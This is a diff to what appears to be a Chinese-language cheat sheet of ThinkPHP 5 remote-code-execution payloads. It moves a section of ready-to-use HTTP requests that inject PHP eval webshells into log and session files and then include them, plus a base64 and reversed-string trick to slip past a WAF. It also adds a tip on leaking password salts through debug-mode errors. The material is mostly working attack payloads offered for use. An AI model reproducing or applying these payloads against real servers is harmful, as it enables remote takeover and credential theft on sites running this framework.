@@ -4,59 +4,6 @@ tp5rce各版本payload。
 
 
 
-# 技巧
-
-- https://xz.aliyun.com/t/6106#toc-5
-- http://r3start.net/index.php/2019/03/15/458
-
-- php 7.1.7 (虽然assert 函数不在disable_function中，但已经无法用call_user_func回调调用)
-- 写到tmp目录，进行包含
-
-bypass getshell
-1，写日志，包含日志 getshell 。payload如下：
-```
-写shell进日志
-_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php eval($_POST['x'])?>
-
-通过日志包含getshell
-_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/201901/21.log&x=phpinfo();
-```
-
-2，写session，包含session getshell。payload如下：
-```
-写shell进session
-POST /?s=captcha HTTP/1.1
-Cookie: PHPSESSID=kking
-
-
-_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval($_POST['x'])?>&server[]=1
-
-包含session getshell
-POST /?s=captcha
-
-_method=__construct&method=get&filter[]=think\__include_file&get[]=tmp\sess_kking&server[]=1
-而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截，还有其他办法吗？
-```
-
-绕过
-第一步
-```
-POST /?s=captcha
-Cookie: PHPSESSID=kktest
-
-_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1
-```
-(payload前后两个ab同样是为了base64解码凑字符的原因)   
-
-第二步
-```
-POST /?s=captcha&r=cGhwaW5mbygpOw==
-
-_method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php
-
-```
-
-
 
 
 
@@ -546,6 +493,64 @@ _method=__construct&filter[]=system&method=GET
 POST ?s=captcha
 _method=__construct&filter[]=system&s=calc&method=get
 ```
+
+
+
+# 技巧
+
+- https://xz.aliyun.com/t/6106#toc-5
+- http://r3start.net/index.php/2019/03/15/458
+
+- php 7.1.7 (虽然assert 函数不在disable_function中，但已经无法用call_user_func回调调用)
+- 写到tmp目录，进行包含
+
+bypass getshell
+1，写日志，包含日志 getshell 。payload如下：
+```
+写shell进日志
+_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php eval($_POST['x'])?>
+
+通过日志包含getshell
+_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/201901/21.log&x=phpinfo();
+```
+
+2，写session，包含session getshell。payload如下：
+```
+写shell进session
+POST /?s=captcha HTTP/1.1
+Cookie: PHPSESSID=kking
+
+
+_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval($_POST['x'])?>&server[]=1
+
+包含session getshell
+POST /?s=captcha
+
+_method=__construct&method=get&filter[]=think\__include_file&get[]=tmp\sess_kking&server[]=1
+而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截，还有其他办法吗？
+```
+
+绕过
+第一步
+```
+POST /?s=captcha
+Cookie: PHPSESSID=kktest
+
+_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1
+```
+(payload前后两个ab同样是为了base64解码凑字符的原因)   
+
+第二步
+```
+POST /?s=captcha&r=cGhwaW5mbygpOw==
+
+_method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php
+
+```
+
+
+ThinkPHP 5.0.X 的一个小trick，在目标启用了 debug 模式下并通过敏感功能点传递空数组时可能会引起程序异常从而导致敏感信息泄漏，如登录处，拿到盐
+
 
 
 # 参考
